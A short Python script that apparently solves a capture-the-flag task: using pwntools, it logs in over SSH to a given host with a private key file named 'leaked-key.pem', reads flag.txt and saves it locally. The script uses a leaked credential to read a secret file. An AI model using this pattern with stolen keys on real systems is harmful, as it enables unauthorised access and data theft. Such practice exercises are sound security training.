import pwn
import argparse

parser = argparse.ArgumentParser()

parser.add_argument('--user', type=str)
parser.add_argument('--host', type=str)
parser.add_argument('--port', type=int)

args = parser.parse_args()

user = args.user
host = args.host
port = args.port

conn = pwn.ssh(user=user, host=host,
               port=port, keyfile='leaked-key.pem')

flag = conn('cat flag.txt')

with open('flag.txt', 'wb') as filp:
    filp.write(flag)

conn.close()
